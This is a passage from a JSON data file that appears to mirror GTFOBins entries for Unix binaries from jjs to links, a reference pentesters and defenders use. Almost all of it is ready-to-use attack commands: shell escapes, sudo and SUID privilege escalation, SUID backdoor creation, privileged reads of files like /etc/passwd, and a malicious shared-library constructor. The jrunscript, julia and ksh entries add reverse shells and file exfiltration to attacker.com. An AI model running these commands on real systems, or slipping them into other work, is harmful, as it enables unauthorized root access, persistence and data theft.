                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This has been found working in macOS but failing on Linux systems.",
                        "code": "sudo install -m =xs $(which jjs) .\n\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
                    }
                ]
            }
        ]
    },
    {
        "name": "joe",
        "url": "https://gtfobins.github.io/gtfobins/joe/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "joe\n^K!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo joe\n^K!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which joe) .\n\n./joe\n^K!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "join",
        "url": "https://gtfobins.github.io/gtfobins/join/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\njoin -a 2 /dev/null $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which join) .\n\nLFILE=file_to_read\n./join -a 2 /dev/null $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "journalctl",
        "url": "https://gtfobins.github.io/gtfobins/journalctl/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This invokes the default pager, which is likely to be less, other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "journalctl\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo journalctl\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "jq",
        "url": "https://gtfobins.github.io/gtfobins/jq/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\njq -Rr . \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which jq) .\n\nLFILE=file_to_read\n./jq -Rr . \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "jtag",
        "url": "https://gtfobins.github.io/gtfobins/jtag/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "jtag --interactive\nshell /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo jtag --interactive\nshell /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "jrunscript",
        "url": "https://gtfobins.github.io/gtfobins/jrunscript/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This tool is installed starting with Java SE 6."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\""
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This has been found working in macOS but failing on Linux systems.",
                        "code": "sudo install -m =xs $(which jrunscript) .\n\n./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
                    }
                ]
            }
        ]
    },
    {
        "name": "julia",
        "url": "https://gtfobins.github.io/gtfobins/julia/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "julia -e 'run(`/bin/sh`)'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\njulia -e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njulia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\njulia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which julia) .\n\n./julia -e 'run(`/bin/sh -p`)'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo julia -e 'run(`/bin/sh`)'"
                    }
                ]
            }
        ]
    },
    {
        "name": "ksh",
        "url": "https://gtfobins.github.io/gtfobins/ksh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ksh"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'"
                    },
                    {
                        "description": "Send local file using a TCP connection. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'"
                    },
                    {
                        "description": "Fetch remote file using a TCP connection. Run nc -l -p 12345 < \"file_to_send\" on the attacker box to send the file.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "It trims trailing newlines.",
                        "code": "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'"
                    },
                    {
                        "description": "It trims trailing newlines.",
                        "code": "export LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ksh) .\n\n./ksh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ksh"
                    }
                ]
            }
        ]
    },
    {
        "name": "knife",
        "url": "https://gtfobins.github.io/gtfobins/knife/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is capable of running ruby code."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "knife exec -E 'exec \"/bin/sh\"'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo knife exec -E 'exec \"/bin/sh\"'"
                    }
                ]
            }
        ]
    },
    {
        "name": "kubectl",
        "url": "https://gtfobins.github.io/gtfobins/kubectl/",
        "functions": [
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=dir_to_serve\nkubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which kubectl) .\n\nLFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
                    }
                ]
            }
        ]
    },
    {
        "name": "ksu",
        "url": "https://gtfobins.github.io/gtfobins/ksu/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ksu -q -e /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "ksshell",
        "url": "https://gtfobins.github.io/gtfobins/ksshell/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Each line is corrupted by a prefix string. Also consider that lines are actually parsed as kickstart scripts thus some file contents may lead to unexpected results."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nksshell -i $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ksshell) .\n\nLFILE=file_to_read\n./ksshell -i $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ksshell -i $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "latex",
        "url": "https://gtfobins.github.io/gtfobins/latex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file will be part of the output.",
                        "code": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The read file will be part of the output.",
                        "code": "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi"
                    },
                    {
                        "description": "",
                        "code": "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which latex) .\n\n./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "latexmk",
        "url": "https://gtfobins.github.io/gtfobins/latexmk/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This allows to execute perl code."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "latexmk -e 'exec \"/bin/sh\";'"
                    },
                    {
                        "description": "",
                        "code": "latexmk -latex='/bin/sh #' /dev/null"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "latexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'"
                    },
                    {
                        "description": "The read file will be part of the output.",
                        "code": "TF=$(mktemp)\necho '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' >$TF\nstrings tmp.dvi"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo latexmk -e 'exec \"/bin/sh\";'"
                    }
                ]
            }
        ]
    },
    {
        "name": "ld.so",
        "url": "https://gtfobins.github.io/gtfobins/ld.so/",
        "functions": [
            {
                "functions": "Info",
                "description": "ld.so is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path can be obtained with:",
                "examples": [
                    {
                        "code": "strings /proc/self/exe | head -1\n/lib64/ld-linux-x86-64.so.2",
                        "description": "It’s worth noting that the spawned process will be the loader, not the target executable, this might aid evasion. See https://shyft.us/posts/20230526_linux_command_proxy.html for more information."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "/lib/ld.so /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ld.so) .\n\n./ld.so /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo /lib/ld.so /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "ldconfig",
        "url": "https://gtfobins.github.io/gtfobins/ldconfig/",
        "functions": [
            {
                "function": "Info",
                "description": "Follows a minimal example of how to use the described technique (details may change across different distributions).",
                "examples": [
                    {
                        "sub_description": "Run the code associated with the technique.\n\nIdentify a target SUID executable, for example the libcap library of ping:",
                        "code": "$ ldd /bin/ping | grep libcap\n\tlibcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)"
                    },
                    {
                        "sub_description": "Create a fake library that spawns a shell at bootstrap:",
                        "code": "echo '#include <unistd.h>\n\n__attribute__((constructor))\nstatic void init() {\n    execl(\"/bin/sh\", \"/bin/sh\", \"-p\", NULL);\n}' >\"$TF/lib.c\""
                    },
                    {
                        "sub_description": "Compile it with:",
                        "code": "gcc -fPIC -shared \"$TF/lib.c\" -o \"$TF/libcap.so.2\""
                    },
                    {
                        "sub_description": "Run ldconfig again as described below then just run ping to obtain a root shell:",
                        "code": "$ ping\n# id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.",
                        "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\""
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.",
                        "code": "sudo install -m =xs $(which ldconfig) .\n\nTF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\""
                    }
                ]
            }
        ]
    },
    {
        "name": "less",
        "url": "https://gtfobins.github.io/gtfobins/less/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "less /etc/profile\n!/bin/sh"
                    },
                    {
                        "description": "",
                        "code": "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv"
                    },
                    {
                        "description": "",
                        "code": "less /etc/profile\nv:shell"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo DATA | less\nsfile_to_write\nq"
                    },
                    {
                        "description": "This invokes the default editor to edit the file. The file must exist.",
                        "code": "less file_to_write\nv"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "less file_to_read"
                    },
                    {
                        "description": "This is useful when less is used as a pager by another binary to read a different file.",
                        "code": "less /etc/profile\n:e file_to_read"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which less) .\n\n./less file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo less /etc/profile\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "lftp",
        "url": "https://gtfobins.github.io/gtfobins/lftp/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "lftp -c '!/bin/sh'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo lftp -c '!/bin/sh'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which lftp) .\n\n./lftp -c '!/bin/sh'"
                    }
                ]
            }
        ]
    },
    {
        "name": "ln",
        "url": "https://gtfobins.github.io/gtfobins/ln/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ln -fs /bin/sh /bin/ln\nsudo ln"
                    }
                ]
            }
        ]
    },
    {
        "name": "links",
        "url": "https://gtfobins.github.io/gtfobins/links/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nlinks \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
